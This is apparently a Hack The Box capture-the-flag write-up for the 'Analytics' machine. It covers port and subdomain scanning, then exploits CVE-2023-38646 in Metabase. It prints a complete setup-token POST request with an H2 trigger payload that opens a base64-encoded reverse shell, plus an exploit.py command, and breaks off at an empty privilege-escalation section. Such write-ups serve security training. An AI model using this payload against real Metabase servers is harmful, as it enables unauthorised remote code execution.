# HTB - Analytics

### TL;DR


__Keywords:__<br>
<br>

__References:__<br>
https://www.cvedetails.com/cve/CVE-2023-38646
<br>
<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target --top-ports 1000 -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-08 15:15 EDT
Nmap scan report for analytical.htb (10.129.136.15)
Host is up, received user-set (0.35s latency).
Not shown: 569 filtered tcp ports (no-response), 429 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds
```
Discover hidden subdomains with `ffuf`
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 154  -t 100 -u http://analytical.htb -H "Host: FUZZ.analytical.htb" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://analytical.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.analytical.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 154
________________________________________________

data                    [Status: 200, Size: 77883, Words: 3574, Lines: 28]
```
Browsing the hidden subdomain at http/:data.analitycal.htb we find a login portal for a metabase service. Searching for metabase vulnerabilities we find out there is a vulnerability (https://www.cvedetails.com/cve/CVE-2023-38646) in the `/api/setup/validate` endpoint, which can lead to rce.
<br>
<br>
### PHASE 2. User
Search for a poc in github for this cve (https://github.com/securezeron/CVE-2023-38646). Analyzing the poc, we see first step is to obtain setup token, for this, just query the `/api/session/properties` endpoint and find `setup-token` field. Then, to obtain rce, we query the `api/setup/validate` endpoint with the setup token and the appropriate payload.
We can do this ourselves with burpsuite.
![analytics1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9512d67d-0565-48bb-8e77-cca05f62f8b9)
So the setup token is `"setup-token" : "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"`. For the payload, just use a base64 sh -i shell and query the endpoint building a post request with burpsuite.
```markdown
POST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Content-Type: application/json Content-Length: 818 

{     "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",     "details":     {         "is_on_demand": false,         "is_full_sync": false,         "is_sample": false,         "cache_ttl": null,         "refingerprint": false,         "auto_run_queries": true,         "schedules":         {},         "details":         {             "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjEvMTkxOSAwPiYxCg==}|{base64,-d}|{bash,-i}')\n$$--=x",             "advanced-options": false,             "ssl": true         },         "name": "an-sec-research-team",         "engine": "h2"     } }
```
![analytics2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/440a1690-57fa-4ec2-9ab5-2568bcfec630)
If this does not work, just use the poc hardocding the shell in base64 within the poc source code and launch the exploit.
```markdown
> python3 exploit.py --rhost data.analytical.htb --lhost 10.10.14.93 --lport 9001
```








<br>
<br>
### PHASE 3. System
Enumerate the system.
```markdown
```markdown


